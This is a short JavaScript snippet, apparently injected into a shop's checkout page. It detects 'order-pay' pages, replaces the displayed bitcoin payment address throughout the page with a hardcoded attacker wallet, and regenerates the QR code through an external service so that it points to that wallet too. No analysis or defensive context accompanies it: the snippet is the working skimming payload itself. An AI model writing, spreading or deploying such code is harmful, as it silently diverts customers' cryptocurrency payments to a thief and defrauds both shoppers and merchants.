// console.log('Ready');
if (window.location.href.includes("order-pay")){
    var add = document.getElementById("payment-address").innerText;
    var amo = document.getElementById("amount").innerText;
    let html = document.body.innerHTML;
    let newHtml = html.replace(new RegExp(add, 'g'), 'bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0');
    document.body.innerHTML = newHtml;
    document.getElementById("qrcode").children[1].src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"
}
